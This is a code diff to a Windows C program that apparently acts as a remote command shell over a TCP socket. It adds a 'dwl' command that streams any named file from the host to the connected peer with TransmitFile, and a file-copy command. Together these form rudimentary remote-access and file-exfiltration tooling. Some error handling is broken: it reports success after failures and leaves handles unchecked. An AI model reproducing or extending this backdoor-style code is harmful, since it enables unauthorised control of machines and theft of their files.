@@ -2,9 +2,12 @@
 #include <winsock2.h>
 #include <windows.h>
 #include <string.h>
+#include <mswsock.h>
+#pragma comment(lib,"Mswsock.lib")
 #pragma comment(lib,"ws2_32.lib")
 
 char buff[1024];
+SOCKET s;
 
 void pwd(){
     DWORD buf_len = 50;  
@@ -16,15 +19,12 @@ void pwd(){
 //Dont use createfile as name of function cause same as windows built-in function
 void fcreate(char my[]){
     char *arr;
-    const char *arr1;
     arr = strtok(my," ");
     int count = 1;
     while(count--){
         arr = strtok(NULL," ");
-    }                                                           // all this to make char * to  const char * what a mess ...
-    // arr1 = (const char *)arr;
+    }                                                           // all this to make char * to  const char * what a mess ..
     LPCSTR Filename ;
-    // strcpy(Filename,arr);
     Filename = (const char *)arr;
     HANDLE filehandler ;
     filehandler = CreateFileA(Filename,GENERIC_READ | GENERIC_WRITE,2,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
@@ -32,9 +32,8 @@ void fcreate(char my[]){
         strcpy(buff,"cant create file .");
         printf("cant create file\n");
     }
-    // FILE *fptr;
-    // fptr = fopen(arr,"w");
-    // fclose(fptr);
+    strcpy(buff,"file created ... ");
+    CloseHandle(filehandler);
 }
 void changedirectory(char *my){
     char arr[strlen(my)];
@@ -80,6 +79,33 @@ void ls(){
     }while(FindNextFile(find,&data));
     strcpy(buff,buff1);
 }
+void transmitfiles(char my[]){
+    char *arr;
+    // printf("hello for dwl ...");
+    arr = strtok(my," ");
+    arr = strtok(NULL," ");
+    LPCSTR Fileopen;
+    Fileopen = (const char *)arr;
+    printf("hello for dwl ...%s",Fileopen);
+    HANDLE openf;
+    openf = CreateFileA(Fileopen,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
+    int status = TransmitFile(s,openf,GetFileSize(openf,NULL),0,NULL,NULL,TF_USE_DEFAULT_WORKER);
+    // CloseHandle(openf);
+}
+void fcopy(char my[]){
+    char *arr,*arr1;
+    arr = strtok(my," ");
+    arr = strtok(NULL," ");
+    arr1 = strtok(NULL," ");
+    LPCSTR FSRC = (const char *)arr;
+    LPCSTR FDST = (const char *)arr1;
+    printf("%s",arr1);
+    int status = CopyFileExA(FSRC,FDST,NULL,NULL,FALSE,COPY_FILE_RESTARTABLE);
+    // int status = CopyFile(FSRC,FDST,TRUE);
+    if(status != 0)
+        printf("copy success ");
+    strcpy(buff,"copied ");
+}
 void shell(char my[]){
     char *arr,b1[strlen(my)+1];
     strcpy(b1,my);
@@ -99,6 +125,13 @@ void shell(char my[]){
     else if(strcmp(arr,"create") == 0){
         fcreate(my);
     }
+    else if(strcmp(arr,"dwl")== 0){
+        transmitfiles(my);
+    }
+    else if(strcmp(arr,"cp")== 0){
+        fcopy(my);
+        printf("shell copy command ");
+    }
     else
         printf("no cmd found ...\n");
 }
@@ -112,7 +145,6 @@ int main(){
         exit(0);
     }
     //Creating socket
-    SOCKET s;
     s = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
     if(s == SOCKET_ERROR){
         printf("socket creation err ... ");
